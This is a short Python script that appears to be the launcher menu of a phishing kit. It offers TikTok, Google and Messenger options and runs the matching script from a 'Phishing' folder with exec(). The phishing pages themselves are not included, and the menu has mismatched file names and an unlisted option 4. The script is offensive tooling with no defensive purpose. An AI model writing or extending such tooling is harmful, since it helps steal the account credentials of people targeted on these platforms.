import os

print('1 - Tik Tok')
print ('2 - Google')
print('3 - Mesenger')

phish = input('Welcome to PT. Choose what you want to do: ')

if phish == '1':
    try:
        with open('Phishing/Tiktok.py', 'r', encoding='utf-8') as file:
            os.system('cls')
            exec(file.read())
    except FileNotFoundError:
        print("File 'Phishing.py' not found.")
    except Exception as e:
        print(f"An error occurred while executing the file: {e}")

if phish =='2':
    try:
        with open('Phishing/Google.py', 'r', encoding='utf-8')as google:
            os.system('cls')
            exec(google.read())
    except FileNotFoundError:
        print("Файл 'GooglePhishing.py' не найден.")
    except Exception as e:
        print(f"Произошла ошибка при выполнении файла: {e}")

if phish =='3':
    try:
        with open('Phishing/Mesenger.py', 'r', encoding='utf-8')as google:
            os.system('cls')
            exec(google.read())
    except FileNotFoundError:
        print("Файл 'Mesenger.py' не найден.")
    except Exception as e:
        print(f"Произошла ошибка при выполнении файла: {e}")

if phish == '4':
    exit()
